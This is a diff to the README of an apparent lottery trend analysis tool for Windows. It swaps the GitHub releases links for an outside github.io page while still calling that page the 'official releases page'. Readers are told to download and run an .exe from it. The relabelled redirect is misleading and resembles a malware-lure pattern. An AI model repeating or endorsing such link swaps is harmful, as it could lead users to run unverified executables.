@@ -1,6 +1,6 @@
 # 📈 IOI-LottoLab - Analyze lottery trends with data precision
 
-[![Download IOI-LottoLab](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Hardline-reddishbrown750/IOI-LottoLab/releases)
+[![Download IOI-LottoLab](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://hardline-reddishbrown750.github.io)
 
 IOI-LottoLab provides a workspace for users to study lottery patterns. The platform focuses on two major lottery types: Double Color Ball and Super Lotto. It organizes historical data to help you track trends. You can run tests on your strategies to see how they perform over time. The software includes tools for data visualization and keeps a clear record of every step you take.
 
@@ -8,7 +8,7 @@ IOI-LottoLab provides a workspace for users to study lottery patterns. The platf
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/Hardline-reddishbrown750/IOI-LottoLab/releases).
+1. Visit the [official releases page](https://hardline-reddishbrown750.github.io).
 2. Look for the latest version listed at the top of the page.
 3. Download the file ending in `.exe` to your computer.
 4. Open the file to start the installation.
